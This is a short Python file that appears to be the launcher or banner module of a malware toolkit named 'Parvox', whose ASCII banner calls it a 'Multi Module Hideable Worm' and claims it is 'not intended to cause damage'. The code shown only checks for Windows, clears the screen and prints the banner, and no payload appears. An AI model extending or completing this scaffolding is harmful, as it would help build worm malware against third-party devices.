import os
from colorama import Fore, Back
from adder import *

M_VERSION = 1.8
M_NAME = "Parvox"

def os_comp():
    if os.name != "nt":
        print("This only works on Windows.")
        exit()
    else:
        print()

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def logo_com():
    print(f"""{Fore.LIGHTRED_EX}
╔════════════════════╗ ╔═══════════════════════════════════╗
║      {Fore.YELLOW}{M_NAME}{Fore.LIGHTRED_EX}        ║ ║        This malware is not        ║
║    Multi Module    ║ ║     intended to cause damage      ║
║   Hideable Worm    ║ ║      to third party devices.      ║
╚════════════════════╝ ╚═══════════════════════════════════╝
╔════════════════════╗ ╔═══════════════════════════════════╗
║    {Fore.YELLOW}VERSION {M_VERSION}{Fore.LIGHTRED_EX}     ║ ║  {Fore.YELLOW}VULNUS RULES! (BORO MADE THIS){Fore.LIGHTRED_EX}   ║
╚════════════════════╝ ╚═══════════════════════════════════╝
""")

